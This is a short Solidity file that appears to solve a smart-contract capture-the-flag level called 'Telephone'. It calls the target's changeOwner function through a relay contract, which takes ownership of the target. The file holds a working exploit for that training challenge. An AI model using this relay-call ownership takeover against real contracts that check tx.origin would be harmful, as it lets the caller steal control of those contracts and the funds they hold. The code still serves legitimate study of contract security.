// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract Level4 {

    //simply call this method to change owner
    function changeOwner(Telephone telephone, address newOwner ) external {
        telephone.changeOwner(newOwner);
    }
    
}